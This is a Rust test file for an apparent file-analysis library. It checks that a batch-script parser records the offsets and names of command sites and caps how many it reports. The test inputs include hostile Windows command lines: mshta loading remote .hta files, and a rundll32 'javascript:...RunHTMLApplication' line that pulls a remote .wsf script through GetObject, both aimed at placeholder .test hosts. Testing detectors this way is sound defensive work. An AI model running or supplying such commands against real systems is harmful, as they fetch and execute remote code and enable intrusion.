use crate::{FileType, OpenOptions};
#[test]
fn preserves_complete_command_source_without_inventing_argv() {
    let source = b"rem mshta https://comment.test/a.hta\r\necho mshta https://printed.test/a.hta\r\nmshta https://program.test/a.hta\r\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:https://program.test/a.wsf\")";
    let parsed = OpenOptions::new().file_type(FileType::Batch).open(source);
    let sites = parsed
        .values()
        .as_json()
        .pointer("/source/batch/command_sites")
        .unwrap()
        .as_array()
        .unwrap();
    assert_eq!(sites.len(), 3);
    for site in sites {
        let offset = site["offset"].as_u64().unwrap() as usize;
        let text = site["text"].as_str().unwrap();
        assert_eq!(&source[offset..offset + text.len()], text.as_bytes());
    }
    assert_eq!(sites[0]["name"], "echo");
    assert_eq!(sites[1]["name"], "mshta");
    assert!(sites[2]["text"].as_str().unwrap().ends_with("a.wsf\")"));
}
#[test]
fn caps_sites_and_reports_omitted_source() {
    let source = "mshta https://program.test/a.hta\n".repeat(200);
    let parsed = OpenOptions::new()
        .file_type(FileType::Batch)
        .open(source.as_bytes());
    let values = parsed.values().as_json();
    assert_eq!(
        values
            .pointer("/source/batch/command_sites")
            .unwrap()
            .as_array()
            .unwrap()
            .len(),
        super::MAX_SITES
    );
    assert_eq!(
        values.pointer("/source/batch/command_sites_truncated"),
        Some(&true.into())
    );
    assert_eq!(
        values.pointer("/source/batch/command_sites/0/offset"),
        Some(&0.into())
    );
}
